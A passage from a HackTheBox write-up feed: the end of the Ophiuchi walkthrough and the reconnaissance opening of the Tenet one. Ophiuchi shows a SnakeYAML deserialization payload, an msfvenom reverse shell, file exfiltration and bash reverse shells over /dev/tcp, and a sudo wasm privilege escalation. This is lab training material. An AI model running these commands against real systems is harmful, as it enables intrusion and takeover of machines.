adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
Total:
------
<span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
</code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">74</span> bytes
Final size of elf file: <span class="m">194</span> bytes
Saved as: iamf-shell
</code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="p">]]</span><span class="w">
</span><span class="w"></span><span class="p">]</span><span class="w">
</span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
<p><div class="img-container"><img src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  /></div>
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>As usual, I will do the PTY trick to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which script
/usr/bin/script                                                     
script /dev/null -c bash                                            
Script started, file is /dev/null                                   
tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
tomcat@ophiuchi:/$ ^Z 
<span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «exploits» «10.10.14.23» 
$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>

tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-admin">Shell as admin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:,,,:/home/admin:/bin/bash
</code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
...<span class="o">[</span>SNIP<span class="o">]</span>...
conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ ssh admin@10.10.10.227 
admin@10.10.10.227<span class="err">&#39;</span>s password: 
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

  System load:             0.08
  Usage of /:              19.9% of 27.43GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               <span class="m">214</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf


...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
admin@ophiuchi:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
</code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>admin</code> is allowed to run a Go program as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:~$ sudo -l
Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User admin may run the following commands on ophiuchi:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
<p>What <code>index.go</code> does is:</p>
<ul>
<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
        <span class="s">&#34;fmt&#34;</span>
        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
        <span class="s">&#34;os/exec&#34;</span>
        <span class="s">&#34;log&#34;</span>
<span class="p">)</span>


<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>

        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
        <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasms-functions</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ ls -lah
total 3.9M
drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
-rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
-rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
-rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
-rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
</code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
<span class="c1">#!/bin/bash</span>

<span class="c1"># ToDo</span>
<span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
</code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
wasm-functions/
wasm-functions/index
wasm-functions/index.go
wasm-functions/deploy.sh
wasm-functions/main.wasm
wasm-functions/backup/
wasm-functions/backup/index.go
wasm-functions/backup/deploy.sh
wasm-functions/backup/main.wasm
admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
</code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
<p>Now I need to find out the content of <code>main.wasm</code>. Fortunately there is a tool to {de,re}compile a wasm file, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
</code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>. It shows that the <code>info</code> function has return value of 0.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «wasm-functions» «10.10.14.23» 
$ wasm-decompile main.wasm 
<span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>

global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
<span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
<span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>

table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>

<span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
  <span class="k">return</span> <span class="m">0</span>
<span class="o">}</span>
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since I need a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, I will create my own <code>main.wasm</code> file from the exfiltrated <code>main.wasm</code> using <code>wasm2wat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
<span class="o">(</span>module
  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
    i32.const 0<span class="o">)</span>
  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
</code></pre></div><p>Then I will modify the return value of the info function to 1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...<span class="o">[</span>SNIP<span class="o">]</span>...
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
    i32.const 1<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ wat2wasm main.wat 
</code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ cat deploy.sh 
<span class="c1">#!/bin/sh</span>
bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
admin@10.10.10.227<span class="err">&#39;</span>s password: 
main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
</code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><p>Now I have a root shell on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45382</span>
root@ophiuchi:/tmp# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@ophiuchi:/tmp# 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  /></div>
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li>
<p><a href="https://www.baeldung.com/java-snake-yaml">https://www.baeldung.com/java-snake-yaml</a></p>
</li>
<li>
<p><a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p>
</li>
<li>
<p><a href="https://webassembly.github.io/wabt/">https://webassembly.github.io/wabt/</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tenet</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</guid>
      <description>Friendly PHP insecure deserialization attack and race condition</description>
      <content:encoded><![CDATA[<p>Tenet is a medium difficulty Linux machine from Hack The Box. It features a basic PHP deserialization vulnerability, which can be leveraged to gain a foothold. Inside the system, enumeration of the web configuration files reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>PHP deserialization attack</li>
<li>Race-condition</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>PHP</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.10.223 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ nmap -sC -sV -p<span class="nv">$ports</span> -oA scans/full-tenet 10.10.10.223
<span class="c1"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
Nmap scan report <span class="k">for</span> 10.10.10.223
Host is up <span class="o">(</span>0.059s latency<span class="o">)</span>.
Scanned at 2021-03-16 23:32:46 EDT <span class="k">for</span> 17s

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
<span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span class="o">=</span>
<span class="p">|</span>   <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><code>nmap</code> already identified that this site is the default page of Apache web server.</p>
<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.223/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,bak
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/06/14 06:08:53 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918<span class="o">]</span>
/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7<span class="o">]</span>    
/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.223/wordpress/<span class="o">]</span>
                                                                                    
<span class="o">===============================================================</span>
2021/06/14 06:11:20 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><p>Poking <code>/users.txt</code> returns a &ldquo;Success&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
</p>
<h4 id="wordpress">/wordpress</h4>
<p>On  <code>/wordpress</code>, somehow  the site looks broken.</p>
<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
</p>
<p>It turns out there is a hostname.</p>
<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
</p>
<p>I&rsquo;ll add <code>tenet.htb</code> to my <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span class="nb">echo</span> <span class="s1">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking the site with <code>curl</code> shows that this port has a slightly different contents when it visited using a hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223 <span class="p">|</span> wc -c
<span class="m">10918</span>
→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://tenet.htb <span class="p">|</span> wc -c 
<span class="m">10581</span>
</code></pre></div><h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
<p>On <code>tenet.htb</code>, there are some blog posts.</p>
<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
</p>
<p>One of the post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
<blockquote>
<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
</blockquote>
<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
</p>
<p>At the bottom, there is a comment by a user named <code>neil</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
</p>
<p>The user was asking about a PHP file called sator and its backup file. I&rsquo;ll note this.</p>
<h4 id="wpscan">WPScan</h4>
<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
